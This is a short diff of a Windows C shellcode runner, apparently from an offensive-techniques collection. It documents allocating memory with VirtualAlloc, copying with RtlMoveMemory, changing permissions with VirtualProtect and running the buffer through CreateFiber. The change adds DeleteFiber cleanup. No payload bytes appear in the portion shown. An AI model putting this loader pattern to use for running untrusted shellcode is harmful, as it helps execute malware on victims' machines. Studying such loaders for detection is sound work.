@@ -9,14 +9,13 @@ Compile:
 
 Technique:
     - allocation: VirtualAlloc
+    - writing:    RtlMoveMemory
     - permission: VirtualProtect
     - execution:  CreateFiber
 */
 
 #include <windows.h>
 #include <stdint.h>
-
-#include <stdio.h>
 
 int main ()
 {
@@ -47,6 +46,9 @@ int main ()
         // create fiber for shellcode and switch to it
         fiber = CreateFiber (0, (LPFIBER_START_ROUTINE) runtime, NULL);
         SwitchToFiber (fiber);
+
+        // delete the fiber after execution end
+        DeleteFiber (fiber);
     }
 
     // deallocate the space
